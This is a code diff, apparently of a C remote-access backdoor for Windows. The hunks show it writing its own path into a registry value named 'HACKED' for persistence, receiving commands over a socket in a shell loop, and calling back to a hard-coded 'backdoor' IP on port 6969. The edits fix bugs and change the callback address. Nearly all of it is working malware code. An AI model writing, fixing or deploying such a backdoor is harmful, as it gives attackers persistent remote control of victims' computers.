@@ -35,7 +35,7 @@ int bootRun() {
     return -1;
   }
 
-  DWORD pathlenInBytes = pathLen * sizeof(*szPath);
+  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
   if(RegSetValueEx(NewVal,TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
     RegCloseKey(NewVal);
     send(sock, err, sizeof(err), 0);
@@ -75,7 +75,7 @@ str_cut(char str[], int slice_from, int slice_to) {
     if(slice_from > str_len - 1) {
       return NULL;
     }
-    buffer_en = slice_to - slice_from;
+    buffer_len = slice_to - slice_from;
     str += slice_from;
   } else {
     return NULL;
@@ -99,7 +99,7 @@ void shell() {
     bzero(container, sizeof(container));
     bzero(response, sizeof(response));
     // receiving functions - storing in buffer
-    recv(sock, buffer, sizeof(response), 0);
+    recv(sock, buffer, 1024, 0);
 
     // commands comparison
     if(strncmp("q", buffer, 1) == 0) {
@@ -146,7 +146,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
   WSADATA wsaData; // windows socket object
 
   // IP for backdoor
-  ip = "192.168.1.111";
+  ip = "192.168.2.126";
   port = 6969;
 
   // check for sock initialization
